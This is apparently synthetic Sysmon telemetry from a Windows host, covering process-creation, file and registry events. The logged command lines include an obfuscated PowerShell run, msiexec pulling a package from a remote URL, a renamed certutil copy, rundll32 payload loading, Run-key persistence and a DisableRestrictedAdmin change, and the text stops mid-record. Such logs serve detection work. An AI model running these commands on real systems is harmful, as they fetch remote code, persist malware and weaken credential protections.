<14>Jun 16 10:06:14 wins-d19 Microsoft-Windows-Sysmon[3120]: {"EventTime":1686909974,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":7242,"ProcessID":3120,"ThreadID":3856,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:14.000\r\nProcessGuid: {9d805503-9113-6441-0801-000000000a00}\r\nProcessId: 2304\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: c:\\windows\\system32\\cmd.exe  /c copy /b C:\\Windows\\System32\\*ertut*.exe c:\\Drivers\\evil.exe\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9034-6441-3c57-0e0000000000}\r\nLogonId: 0xE573C\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-9101-6441-0501-000000000a00}\r\nParentProcessId: 4852\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:14.000","ProcessGuid":"{9d805503-9113-6441-0801-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"c:\\windows\\system32\\cmd.exe  /c copy /b C:\\Windows\\System32\\*ertut*.exe c:\\Drivers\\evil.exe","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9034-6441-3c57-0e0000000000}","LogonId":"0xe573c","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-9101-6441-0501-000000000a00}","ParentProcessId":"4852","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909974,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:15 wins-d19 Microsoft-Windows-Sysmon[3120]: {"EventTime":1686909975,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":10974,"ProcessID":3120,"ThreadID":3856,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:15.000\r\nProcessGuid: {9d805503-91e6-6441-3601-000000000a00}\r\nProcessId: 5724\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe /c C:\\Programdata\\w.bat\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9034-6441-3c57-0e0000000000}\r\nLogonId: 0xE573C\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-91ca-6441-2601-000000000a00}\r\nParentProcessId: 1128\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:15.000","ProcessGuid":"{9d805503-91e6-6441-3601-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"cmd.exe /c C:\\Programdata\\w.bat","CurrentDirectory":"C:\\Windows\\system32\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9034-6441-3c57-0e0000000000}","LogonId":"0xe573c","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-91ca-6441-2601-000000000a00}","ParentProcessId":"1128","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","EventReceivedTime":1686909975,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:16 wins-d19 Microsoft-Windows-Sysmon[3120]: {"EventTime":1686909976,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":72738,"ProcessID":3120,"ThreadID":3856,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:16.000\r\nProcessGuid: {9d805503-9317-6441-e601-000000000a00}\r\nProcessId: 5508\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe   -exec bypass -noni -nop -w 1 -C \" \" $(SeT-ITEm 'vARIAble:Ofs'  '') \"+[StRING](( 1,1,1,1, )|%% { ( [cHAr] [InT] $_) } )+\"$(SEt-ItEm  'VaRIablE:OFs'  ' ' )\"|. ( $enV:CoMsPec[4,24,25]-jOIN'')\"\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9034-6441-3c57-0e0000000000}\r\nLogonId: 0xE573C\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C\r\nParentProcessGuid: {9d805503-9101-6441-0501-000000000a00}\r\nParentProcessId: 4852\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:16.000","ProcessGuid":"{9d805503-9317-6441-e601-000000000a00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Windows PowerShell","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe   -exec bypass -noni -nop -w 1 -C \" \" $(SeT-ITEm 'vARIAble:Ofs'  '') \"+[StRING](( 1,1,1,1, )|%% { ( [cHAr] [InT] $_) } )+\"$(SEt-ItEm  'VaRIablE:OFs'  ' ' )\"|. ( $enV:CoMsPec[4,24,25]-jOIN'')\"","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9034-6441-3c57-0e0000000000}","LogonId":"0xe573c","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C","ParentProcessGuid":"{9d805503-9101-6441-0501-000000000a00}","ParentProcessId":"4852","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909976,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:17 wins-d19 Microsoft-Windows-Sysmon[2840]: {"EventTime":1686909977,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":13556,"ProcessID":2840,"ThreadID":4276,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:17.000\r\nProcessGuid: {9d805503-922f-643d-f001-000000000a00}\r\nProcessId: 176\r\nImage: C:\\Users\\lisawalker\\Desktop\\tar.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: tar.exe  -xvf c:\\Users\\lisawalker\\AppData\\Roaming\\derp.out\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-6d70-643d-7a56-420000000000}\r\nLogonId: 0x42567A\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-91c1-643d-ed01-000000000a00}\r\nParentProcessId: 3208\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:17.000","ProcessGuid":"{9d805503-922f-643d-f001-000000000a00}","Image":"C:\\Users\\lisawalker\\Desktop\\tar.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"tar.exe  -xvf c:\\Users\\lisawalker\\AppData\\Roaming\\derp.out","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-6d70-643d-7a56-420000000000}","LogonId":"0x42567a","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-91c1-643d-ed01-000000000a00}","ParentProcessId":"3208","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909977,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:18 wins-d19 Microsoft-Windows-Sysmon[3088]: {"EventTime":1686909978,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":219703,"ProcessID":3088,"ThreadID":4036,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:18.000\r\nProcessGuid: {9d805503-da42-6442-ff01-000000000a00}\r\nProcessId: 4588\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe /Q /c \\Windows\\Temp\\yappy.exe\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-bef5-6442-a389-090000000000}\r\nLogonId: 0x989A3\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-da38-6442-f501-000000000a00}\r\nParentProcessId: 4216\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:18.000","ProcessGuid":"{9d805503-da42-6442-ff01-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"cmd.exe /Q /c \\Windows\\Temp\\yappy.exe","CurrentDirectory":"C:\\Windows\\system32\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-bef5-6442-a389-090000000000}","LogonId":"0x989a3","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-da38-6442-f501-000000000a00}","ParentProcessId":"4216","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","EventReceivedTime":1686909978,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:19 wins-d19 Microsoft-Windows-Sysmon[1988]: {"EventTime":1686909979,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":11,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":11,"OpcodeValue":0,"RecordNumber":32372,"ProcessID":1988,"ThreadID":3884,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"File created:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:19.000\r\nProcessGuid: {9d805503-dd67-6447-c100-000000000a00}\r\nProcessId: 5992\r\nImage: C:\\Windows\\Explorer.EXE\r\nTargetFilename: C:\\Users\\lisawalker\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Downloads Setup 123 Passwords FUll.rar.lnk\r\nCreationUtcTime: 2023-06-16 10:06:19.000","Category":"File created (rule: FileCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:19.000","ProcessGuid":"{9d805503-dd67-6447-c100-000000000a00}","Image":"C:\\Windows\\Explorer.EXE","TargetFilename":"C:\\Users\\lisawalker\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Downloads Setup 123 Passwords FUll.rar.lnk","CreationUtcTime":"2023-06-16 10:06:19.000","EventReceivedTime":1686909979,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:20 wins-d19 Microsoft-Windows-Sysmon[3156]: {"EventTime":1686909980,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":5698,"ProcessID":3156,"ThreadID":3892,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:20.000\r\nProcessGuid: {9d805503-ed7e-6447-0301-000000000a00}\r\nProcessId: 1644\r\nImage: C:\\$RECYCLER.BIN\\calc.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Windows Calculator\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CALC.EXE\r\nCommandLine: \"C:\\$RECYCLER.BIN\\calc.exe\"\r\nCurrentDirectory: C:\\$RECYCLER.BIN\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-ed10-6447-4517-0c0000000000}\r\nLogonId: 0xC1745\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51\r\nParentProcessGuid: {9d805503-ed3c-6447-f600-000000000a00}\r\nParentProcessId: 6576\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:20.000","ProcessGuid":"{9d805503-ed7e-6447-0301-000000000a00}","Image":"C:\\$RECYCLER.BIN\\calc.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Windows Calculator","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"CALC.EXE","CommandLine":"\"C:\\$RECYCLER.BIN\\calc.exe\"","CurrentDirectory":"C:\\$RECYCLER.BIN\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-ed10-6447-4517-0c0000000000}","LogonId":"0xc1745","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51","ParentProcessGuid":"{9d805503-ed3c-6447-f600-000000000a00}","ParentProcessId":"6576","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","EventReceivedTime":1686909980,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:21 wins-d19 Microsoft-Windows-Sysmon[3084]: {"EventTime":1686909981,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":225120,"ProcessID":3084,"ThreadID":3264,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:21.000\r\nProcessGuid: {9d805503-6113-6449-f801-000000000a00}\r\nProcessId: 5664\r\nImage: C:\\Windows\\System32\\msiexec.exe\r\nFileVersion: 5.0.17763.404 (WinBuild.160101.0800)\r\nDescription: Windows® installer\r\nProduct: Windows Installer - Unicode\r\nCompany: Microsoft Corporation\r\nOriginalFileName: msiexec.exe\r\nCommandLine: mSiEXEc  Lp=fox bVtYM=gnhVGYo XhPDfxy=FDSfLLzt /fV \"HtTp://nWz.lI:8080/ykABq/UULQcaHu/ZnCfkw2FFvR/SARYDL6ZPG7M3=HallalP\" nFAtQq=JtEBwKi MvIb=AywYoJ\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-1b4a-6449-21de-0d0000000000}\r\nLogonId: 0xDDE21\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=DC52A89F2FCBD8E31F2D466BD2D35414A86BB907382251FABB88CD3969FB3EC8\r\nParentProcessGuid: {9d805503-60ec-6449-f601-000000000a00}\r\nParentProcessId: 5880\r\nParentImage: C:\\Users\\lisawalker\\Desktop\\cmd.exe\r\nParentCommandLine: \"C:\\Users\\lisawalker\\Desktop\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:21.000","ProcessGuid":"{9d805503-6113-6449-f801-000000000a00}","Image":"C:\\Windows\\System32\\msiexec.exe","FileVersion":"5.0.17763.404 (WinBuild.160101.0800)","Description":"Windows® installer","Product":"Windows Installer - Unicode","Company":"Microsoft Corporation","OriginalFileName":"msiexec.exe","CommandLine":"mSiEXEc  Lp=fox bVtYM=gnhVGYo XhPDfxy=FDSfLLzt /fV \"HtTp://nWz.lI:8080/ykABq/UULQcaHu/ZnCfkw2FFvR/SARYDL6ZPG7M3=HallalP\" nFAtQq=JtEBwKi MvIb=AywYoJ","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-1b4a-6449-21de-0d0000000000}","LogonId":"0xdde21","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=DC52A89F2FCBD8E31F2D466BD2D35414A86BB907382251FABB88CD3969FB3EC8","ParentProcessGuid":"{9d805503-60ec-6449-f601-000000000a00}","ParentProcessId":"5880","ParentImage":"C:\\Users\\lisawalker\\Desktop\\cmd.exe","ParentCommandLine":"\"C:\\Users\\lisawalker\\Desktop\\cmd.exe\" ","EventReceivedTime":1686909981,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:22 wins-d19 Microsoft-Windows-Sysmon[3084]: {"EventTime":1686909982,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":223506,"ProcessID":3084,"ThreadID":3264,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:22.000\r\nProcessGuid: {9d805503-5cb8-6449-f501-000000000a00}\r\nProcessId: 5484\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe  \\c rundll32.exe derp.dll,derp\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-1b4a-6449-21de-0d0000000000}\r\nLogonId: 0xDDE21\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-5cae-6449-f301-000000000a00}\r\nParentProcessId: 4956\r\nParentImage: C:\\Users\\lisawalker\\Desktop\\explorer.exe\r\nParentCommandLine: \"C:\\Users\\lisawalker\\Desktop\\explorer.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:22.000","ProcessGuid":"{9d805503-5cb8-6449-f501-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"cmd.exe  \\c rundll32.exe derp.dll,derp","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-1b4a-6449-21de-0d0000000000}","LogonId":"0xdde21","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-5cae-6449-f301-000000000a00}","ParentProcessId":"4956","ParentImage":"C:\\Users\\lisawalker\\Desktop\\explorer.exe","ParentCommandLine":"\"C:\\Users\\lisawalker\\Desktop\\explorer.exe\" ","EventReceivedTime":1686909982,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:23 wins-d19 Microsoft-Windows-Sysmon[2852]: {"EventTime":1686909983,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":13,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":13,"OpcodeValue":0,"RecordNumber":1401257,"ProcessID":2852,"ThreadID":3836,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2023-06-16 10:06:23.000\r\nProcessGuid: {9d805503-3973-6449-fa06-000000000b00}\r\nProcessId: 5500\r\nImage: C:\\Windows\\regedit.exe\r\nTargetObject: HKU\\S-1-5-21-1304786106-3280469869-1729135207-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\nuWF.dll\r\nDetails: C:\\WINDOWS\\system32\\regsvr32.exe \"C:\\Users\\test\\AppData\\Local\\LNRsSwGH\\nuWF.dll\"","Category":"Registry value set (rule: RegistryEvent)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:23.000","ProcessGuid":"{9d805503-3973-6449-fa06-000000000b00}","Image":"C:\\Windows\\regedit.exe","TargetObject":"HKU\\S-1-5-21-1304786106-3280469869-1729135207-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\nuWF.dll","Details":"C:\\WINDOWS\\system32\\regsvr32.exe \"C:\\Users\\test\\AppData\\Local\\LNRsSwGH\\nuWF.dll\"","EventReceivedTime":1686909983,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:24 wins-d19 Microsoft-Windows-Sysmon[2852]: {"EventTime":1686909984,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":1402919,"ProcessID":2852,"ThreadID":3836,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:24.000\r\nProcessGuid: {9d805503-3b3e-6449-0307-000000000b00}\r\nProcessId: 2904\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: \"C:\\Windows\\system32\\reg.exe\" add hklm\\system\\currentcontrolset\\control\\lsa /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-33ae-6449-cd07-6c0000000000}\r\nLogonId: 0x6C07CD\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF\r\nParentProcessGuid: {9d805503-3b1d-6449-0107-000000000b00}\r\nParentProcessId: 2988\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","Category":"Process Create (rule: 